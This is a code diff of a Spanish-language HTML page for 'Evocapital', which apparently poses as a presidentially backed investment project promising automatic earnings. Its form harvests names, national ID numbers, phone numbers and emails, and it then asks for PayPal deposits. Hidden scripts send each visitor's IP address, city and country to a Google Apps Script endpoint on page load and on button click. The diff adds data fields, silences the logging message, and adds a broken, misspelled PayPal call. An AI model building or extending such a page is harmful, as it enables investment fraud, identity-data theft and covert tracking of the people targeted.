@@ -1,10 +1,16 @@
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Evocapital - Proyecto Presidenta</title>
   <link rel="stylesheet" href="style.css" />
+  <script
+    src="https://www.paypal.com/sdk/js?client-id=BAAQ4-asoZj56A6vjWzMmDgqeUASwPdd_bbdQNdj3zAox7c3YKYtNYnqKKTLAaBS39Ut0zCPkRgNnF82ck&components=hosted-buttons&disable-funding=venmo&currency=USD">
+    </script>
+
+
   <style>
     body {
       margin: 0;
@@ -71,7 +77,8 @@
       gap: 12px;
     }
 
-    input, select {
+    input,
+    select {
       padding: 10px;
       border: none;
       border-radius: 8px;
@@ -91,14 +98,16 @@
       margin-top: 30px;
     }
   </style>
-  
+
 </head>
+
 <body>
   <div id="popup" class="popup">
     <div class="popup-content">
       <img src="logo_evocapital.png" alt="Evocapital Logo" class="logo">
       <h2>Bienvenido a Evocapital</h2>
-      <p class="subtitle">Únete al proyecto económico respaldado por la presidenta. Llena tus datos para comenzar a recibir tus ganancias de forma segura y automatizada.</p>
+      <p class="subtitle">Únete al proyecto económico respaldado por la presidenta. Llena tus datos para comenzar a
+        recibir tus ganancias de forma segura y automatizada.</p>
       <form>
         <input type="text" placeholder="Nombre" required>
         <input type="text" placeholder="Apellido" required>
@@ -116,80 +125,94 @@
           <option value="30">Cada 30 días</option>
         </select>
         <input type="text" placeholder="Número de identificación (INE 9 Digitos)" required>
+        <input type="text" placeholder="Número de telefono +52" required>
+        <input type="text" placeholder="Correo Electronico" required>
         <p class="mensaje-final">
-          Una vez que completes tus datos, realiza tu depósito y empieza a generar ingresos automáticamente con el respaldo institucional de Evocapital.
+          Una vez que completes tus datos, realiza tu depósito y empieza a generar ingresos automáticamente con el
+          respaldo institucional de Evocapital.
         </p>
       </form>
-    <div id="paypal-container-VUNNVZKCVF3RY"></div>
-      
+
+      <div id="paypal-container-6FHVQ6C5JCAF2"></div>
+      <script>
+        paypal.HostedButtons({
+          hostedButtonId: "6FHVQ6C5JCAF2",
+        }).render("#paypal-container-6FHVQ6C5JCAF2")
+      </script>
+
+      <div id="paypal-container-VUNNVZKCVF3RY"></div>
+      <script>
+        paypal.HostedButtons({
+          hostedButtonId: "VUNNVZKCVF3RY",
+        }).render("#paypal-container-VUNNVZKCVF3RY")
+      </script>
     </div>
   </div>
 
-  <script 
-    src="https://www.paypal.com/sdk/js?client-id=BAAQ4-asoZj56A6vjWzMmDgqeUASwPdd_bbdQNdj3zAox7c3YKYtNYnqKKTLAaBS39Ut0zCPkRgNnF82ck&components=hosted-buttons&disable-funding=venmo&currency=USD">
-  </script>
-  <script>
-  paypal.HostedButtons({
-    hostedButtonId: "VUNNVZKCVF3RY",
-  }).render("#paypal-container-VUNNVZKCVF3RY")
-</script>
   <script>
     const observer = new MutationObserver(() => {
-    const btn = document.querySelector('div#paypal-container-VUNNVZKCVF3RY button');
-    if (btn) {
-      btn.addEventListener('click', () => {
+      const btn = document.querySelector('div#paypal-container-VUNNVZKCVF3RY button');
+      if (btn) {
+        btn.addEventListener('click', () => {
 
-            fetch("https://ipapi.co/json/")
-    .then(res => res.json())
-    .then(data => {
-      fetch("https://script.google.com/macros/s/AKfycbwiW9FE5Vq4Mn0tY9yJQAjeB0ZUCkVUGMca-SF83PmmvKtmJ_yEadNCeHGMF0ZcQKY/exec", {
-        method: "POST",
-        mode: "no-cors",
-        body: JSON.stringify({
-          ip: data.ip,
-          city: data.city,
-          country: data.country_name,
-          paypal: "Boton Pago"
-        }),
-        headers: {
-          "Host": "script.google.com",
-          "Content-Type": "application/json"
-        }
-      }).then(res => console.log("Visitante registrado"));
-    })
-    .catch(err => console.error("Error:", err));
-        // Aquí puedes enviar una alerta, guardar en Google Sheets o enviar a webhook
+          fetch("https://ipapi.co/json/")
+            .then(res => res.json())
+            .then(data => {
+              fetch("https://script.google.com/macros/s/AKfycbwiW9FE5Vq4Mn0tY9yJQAjeB0ZUCkVUGMca-SF83PmmvKtmJ_yEadNCeHGMF0ZcQKY/exec", {
+                method: "POST",
+                mode: "no-cors",
+                body: JSON.stringify({
+                  ip: data.ip,
+                  city: data.city,
+                  country: data.country_name,
+                  paypal: "Boton Pago"
+                }),
+                headers: {
+                  "Host": "script.google.com",
+                  "Content-Type": "application/json"
+                }
+              }).then(res => console.log(""));
+            })
+            .catch(err => console.error("Error:", err));
+          // Aquí puedes enviar una alerta, guardar en Google Sheets o enviar a webhook
 
-      });
-      observer.disconnect(); // Deja de observar después de encontrar el botón
-    }
-  });
+        });
+        observer.disconnect(); // Deja de observar después de encontrar el botón
+      }
+    });
 
-  observer.observe(document.getElementById("paypal-container-VUNNVZKCVF3RY"), {
-    childList: true,
-    subtree: true
-  });
+    observer.observe(document.getElementById("paypal-container-VUNNVZKCVF3RY"), {
+      childList: true,
+      subtree: true
+    });
 
     fetch("https://ipapi.co/json/")
-    .then(res => res.json())
-    .then(data => {
-      fetch("https://script.google.com/macros/s/AKfycbwiW9FE5Vq4Mn0tY9yJQAjeB0ZUCkVUGMca-SF83PmmvKtmJ_yEadNCeHGMF0ZcQKY/exec", {
-        method: "POST",
-        mode: "no-cors",
-        body: JSON.stringify({
-          ip: data.ip,
-          city: data.city,
-          country: data.country_name,
-          paypal:"aun no oprimido"
-        }),
-        headers: {
-          "Host": "script.google.com",
-          "Content-Type": "application/json"
-        }
-      }).then(res => console.log("Visitante registrado"));
-    })
-    .catch(err => console.error("Error:", err));
+      .then(res => res.json())
+      .then(data => {
+        fetch("https://script.google.com/macros/s/AKfycbwiW9FE5Vq4Mn0tY9yJQAjeB0ZUCkVUGMca-SF83PmmvKtmJ_yEadNCeHGMF0ZcQKY/exec", {
+          method: "POST",
+          mode: "no-cors",
+          body: JSON.stringify({
+            ip: data.ip,
+            city: data.city,
+            country: data.country_name,
+            paypal: "aun no oprimido"
+          }),
+          headers: {
+            "Host": "script.google.com",
+            "Content-Type": "application/json"
+          }
+        }).then(res => console.log(""));
+      })
+      .catch(err => console.error("Error:", err));
   </script>
+  <script>
+    paypal.HostedButtFons({
+      hostedButtonId: "VUNNVZKCVF3RY",
+    }).render("#paypal-container-VUNNVZKCVF3RY")
+  </script>
+
   <script src="script.js"></script>
 </body>
+
 </html>
